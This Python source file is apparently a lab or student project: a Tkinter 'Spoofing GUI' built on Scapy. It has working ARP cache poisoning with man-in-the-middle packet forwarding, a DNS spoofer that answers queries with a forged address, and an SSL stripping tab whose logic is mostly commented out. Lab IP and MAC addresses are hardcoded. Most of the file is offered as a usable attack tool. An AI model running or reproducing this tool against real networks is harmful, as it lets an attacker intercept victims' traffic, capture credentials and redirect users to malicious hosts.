import tkinter as tk
from tkinter import ttk
from scapy.all import *
from scapy.layers.inet import TCP_client
import threading


# ENTER YOUR HOST DETAILS HERE
m3_IP = "192.168.230.130"
m3_MAC = "00:0c:29:7d:95:84"
interface = "eth0" 

sslStrip = False

def spoof_arp():
    target_ip = target_ip_entry.get()
    gateway_ip = gateway_ip_entry.get()
    packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip)
    send(packet, verbose=0)


def spoof_dns():

    spoofed_ip = spoofed_ip_entry.get()
    while(True):
	    sniff(filter="udp and port 53",iface="eth0", prn=lambda packet: dns_spoof(packet, spoofed_ip), store=0)
	    print("loop dns" )

def dns_spoof(packet,spoofed_ip):
	if DNSQR in packet and packet[DNS].qr == 0:
		print("Incoming packet")
		packet.show()
		#Create each layer of the spoofed dns packet
		etherPacketSpoofed = Ether(src = m3_MAC, dst = packet[Ether].src)
		ipPacketSpoofed = IP(src = packet[IP].dst, dst = packet[IP].src)
		udpPacketSpoofed = UDP(sport = packet[UDP].dport, dport = packet[UDP].sport)
		dnsrrPacketSpoofed = DNSRR(rrname=packet[DNS].qd.qname, rdata="192.168.56.102")
		dnsPacketSpoofed = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=dnsrrPacketSpoofed)
		spoofed_pkt = etherPacketSpoofed/ipPacketSpoofed/udpPacketSpoofed/dnsPacketSpoofed
		print("Outgoing packet")
		spoofed_pkt.show()
		#Send the packet
		sendp(spoofed_pkt, iface="eth0", verbose=False)

def ssl_strip():
	global sslStrip
	sslStrip = True
	arpspoof()

loop_arpspoof=0

#m1_IP = "192.168.56.101"
#m1_MAC = "08:00:27:b7:c4:af"
#m2_IP = "192.168.56.102"
#m2_MAC = "08:00:27:cc:08:6f"
#m3_IP = "192.168.56.103"
#m3_MAC = "08:00:27:d0:25:4b"
#interface = "enp0s3" 




def sendArpPack():
	print("send arp pack")
	
	macAttacker = m3_MAC
	ipAttacker = m3_IP

	# Victim
	macSender = machine1_mac_entry.get()
	ipSender = machine1_ip_entry.get()

	# Other victim
	macReceiver = machine2_mac_entry.get()
	ipReceiver = machine2_ip_entry.get()
	
	bidirectional = bidirectional_checkbox_var.get()
	
	arp= Ether() / ARP()
	arp[Ether].src = macAttacker
	arp[ARP].hwsrc = macAttacker
	arp[ARP].psrc = ipReceiver
	arp[ARP].hwdst = macSender
	arp[ARP].pdst = ipSender

	sendp(arp, iface=interface, loop=loop_arpspoof, inter=1, verbose=False)
	
	# Second direction
	if (bidirectional == 1): 

		# We want to spoof the Ip of the server, 102, such that all traffic meant for the server goes through us.
		# So the victims arp table will contain our mac address linked to ipToSpoof

		arp1= Ether() / ARP()
		arp1[Ether].src = macAttacker
		arp1[ARP].hwsrc = macAttacker
		arp1[ARP].psrc = ipSender
		arp1[ARP].hwdst = macReceiver
		arp1[ARP].pdst = ipReceiver

		sendp(arp1, iface=interface, loop=loop_arpspoof, inter=1, verbose=False)

def loopArp():
	print("start arp loop")
	while(True):
		print("arp spoof step")
		sendArpPack()

def arpspoof():
	
	print("start spoofing")
	
	
	print("Hi")
	
	bidirectional = bidirectional_checkbox_var.get()
	
	loud_mode = loudmode_checkbox_var.get()
	
	print(" After retrieving")
		
	# macAttacker = m3_MAC
	# ipAttacker = m3_IP

	# macVictim = m1_MAC
	# ipVictim = m1_IP

	# ipToSpoof = m2_IP

	# Attacker = 103
	# Victim = 101
	# We want to spoof the Ip of the server, 102, such that all traffic meant for the server goes through us.
	# So the victims arp table will contain our mac address linked to ipToSpoof

	arpThread = threading.Thread(target=loopArp)
	arpThread.start()
	print("thread started")





	if (loud_mode == 0):
		sniffThreadRun = threading.Thread(target=sniffThread)
		sniffThreadRun.start()
			
			
			# pkts = sniff(filter="host " + m2_IP, count=1)
			# # print(pkts[0].show())
			# # Change the MAC to the senders actual MAC
			# pkts[0].hwsrc = macVictim 
			# send(pkts[0], iface="enp0s3")
			# print(pkts[0].show())
			# sendp(arp, iface="enp0s3", loop=loop_arpspoof, inter=1)
		
def sniffThread():
	macAttacker = m3_MAC
	ipAttacker = m3_IP

	# Victim
	macSender = machine1_mac_entry.get()
	ipSender = machine1_ip_entry.get()

	# Other victim
	macReceiver = machine2_mac_entry.get()
	ipReceiver = machine2_ip_entry.get()
	sniff(store=0, prn= lambda packet: packet_forward(packet, ipSender, ipReceiver, macSender, macReceiver), iface=interface)



def packet_forward(packet, ipSender, ipReceiver, macSender, macReceiver):
	# if(ARP in packet and packet[ARP].pdst == ipReceiver):
	# 	print(packet.show())
	# 	sendArpPack()
	# 	return
	if (IP in packet):
		if (packet[IP].src == ipSender and packet[IP].dst == ipReceiver):
			#print ("Packet sent from sender to receiver")
			packet[Ether].src = macSender
			packet[Ether].dst = macReceiver
		elif (packet[IP].src == ipReceiver and packet[IP].dst == ipSender):			
			#print ("Packet sent from receiver to sender")
			packet[Ether].src = macReceiver
			packet[Ether].dst = macSender
		# else: 
		# 	#print ("Other IP packet was sent: ", packet.summary())
		# 	pass
		if TCP in packet and Raw in packet \
				and "HTTP" in packet[Raw].load \
			and ssl_strip_entry.get() in packet[Raw].load:
			stripSsl(packet)

	else:
		#print ("Other non-IP packet was sent: ", packet.summary())
		pass
	try:
		pass
		#print(macSender, macReceiver)
		sendp(packet, verbose=False, iface=interface)
		#print("send package source", packet[Ether].src, "destination", packet[Ether].dst)
	except:
		print("packet could not be send: ")
		#print(packet.show())
		pass
	# print("Sent packet")
	#print(packet.show())


#from scapy.layers.http import * 
#from scapy.layers.ssl_tls import *

#tls_version = TLSVersion.TLS_1_2
#extensions = [TLSExtension() / TLSExtECPointsFormat(),
#              TLSExtension() / TLSExtSupportedGroups()]
#ciphers = [TLSCipherSuite.ECDHE_RSA_WITH_AES_128_GCM_SHA256]


def stripSsl(packet):
	print(" sslstrip")
	#print(packet.show())

	#serverIp = packet[IP].dst
	#serverPort = packet[TCP].dport

	#https://github.com/tintinweb/scapy-ssl_tls/blob/master/examples/full_rsa_connection_with_application_data.py

	#with TLSSocket(client=True) as tls_socket:
	#	print("connect to server")
	#	tls_socket.connect((serverIp, serverPort))
	#	# server_hello, server_kex = tls_socket.do_handshake()
	#	print("do handshake")
	#	print(serverIp, serverPort)

	#	server_hello, server_kex = tls_socket.do_handshake(tls_version, ciphers, extensions)
	#	print("handshake done")
	#	server_hello.show()

	#	print("send packet")
	#	resp = tls_socket.do_round_trip(TLSPlaintext(data=packet[Raw].load))
		
	#	print(resp)
	#	print(resp.show())

	#	response = IP(src=serverIp, dst=packet[IP].src) \
	#		 / TCP(sport=resp[TCP].sport, dport=packet[TCP].sport, \
	#		 flags="A", seq=ACK.ack, ack=ACK.seq) \
	#		 / resp[Raw].load 

	#	sendp(response)



# Create the main window
window = tk.Tk()
window.title("Spoofing GUI")
window.configure(bg="#111111")

# Create the tab control style
style = ttk.Style()
style.theme_use("clam")
style.configure("TNotebook",
                background="#333333",
                foreground="black",
                borderwidth=0)
style.configure("TNotebook.Tab",
                background="#666666",
                foreground="black",
                padding=[10, 5])
style.map("TNotebook.Tab",
          background=[("selected", "#555555")],
          foreground=[("selected", "white")])

# Create the tab control
tab_control = ttk.Notebook(window)

# Create the ARP spoofing tab
arp_tab = ttk.Frame(tab_control)
tab_control.add(arp_tab, text="ARP Spoofing")

# Create and place the labels and entry fields for ARP spoofing
machine1_ip_label = tk.Label(arp_tab, text="Machine 1 IP:", fg="white")
machine1_ip_label.pack()
machine1_ip_entry = tk.Entry(arp_tab)
machine1_ip_entry.insert(0, "192.168.230.129") 
machine1_ip_entry.pack()

machine1_mac_label = tk.Label(arp_tab, text="Machine 1 MAC:", fg="white")
machine1_mac_label.pack()
machine1_mac_entry = tk.Entry(arp_tab)
machine1_mac_entry.insert(0, "00:0C:29:1f:df:4") 
machine1_mac_entry.pack()

machine2_ip_label = tk.Label(arp_tab, text="Machine 2 IP:", fg="white")
machine2_ip_label.pack()
machine2_ip_entry = tk.Entry(arp_tab)
machine2_ip_entry.insert(0, "192.168.230.2") 
machine2_ip_entry.pack()

machine2_mac_label = tk.Label(arp_tab, text="Machine 2 MAC:", fg="white")
machine2_mac_label.pack()
machine2_mac_entry = tk.Entry(arp_tab)
machine2_mac_entry.insert(0, "00:50:56:fe:db:77")
machine2_mac_entry.pack()

bidirectional_checkbox_var = tk.IntVar()
bidirectional_checkbox = tk.Checkbutton(arp_tab, text="Bidirectional", variable=bidirectional_checkbox_var)
bidirectional_checkbox.pack()

loudmode_checkbox_var = tk.IntVar()
loudmode_checkbox = tk.Checkbutton(arp_tab, text="Loud Mode", variable=loudmode_checkbox_var)
loudmode_checkbox.pack()

print(" Hi " )

spoof_arp_button = tk.Button(arp_tab, text="Spoof ARP", command=arpspoof)
spoof_arp_button.pack()

# Create the DNS spoofing tab
dns_tab = ttk.Frame(tab_control)
tab_control.add(dns_tab, text="DNS Spoofing")

# Create and place the labels and entry fields for DNS spoofing


spoofed_ip_label = tk.Label(dns_tab, text="Spoofed IP:", bg="#333333", fg="white")
spoofed_ip_label.pack()
spoofed_ip_entry = tk.Entry(dns_tab)
spoofed_ip_entry.pack()

spoof_dns_button = tk.Button(dns_tab, text="Spoof DNS", command=spoof_dns)
spoof_dns_button.pack()

# Pack the tab control
tab_control.pack(expand=1, fill="both")

# Create the SSL stripping tab
ssl_tab = ttk.Frame(tab_control)
tab_control.add(ssl_tab, text="SSL Stripping")

ssl_strip_label = tk.Label(ssl_tab, text="Url to strip:", bg="#333333", fg="white")
ssl_strip_label.pack()
ssl_strip_entry = tk.Entry(ssl_tab)
ssl_strip_entry.pack()
ssl_strip_button = tk.Button(ssl_tab, text="Start SSL Stripping", command=ssl_strip)
ssl_strip_button.pack()

def close_window():
	window.destroy()

window.protocol("WM_DELETE_WINDOW", close_window)

# Start the GUI event loop
window.mainloop()





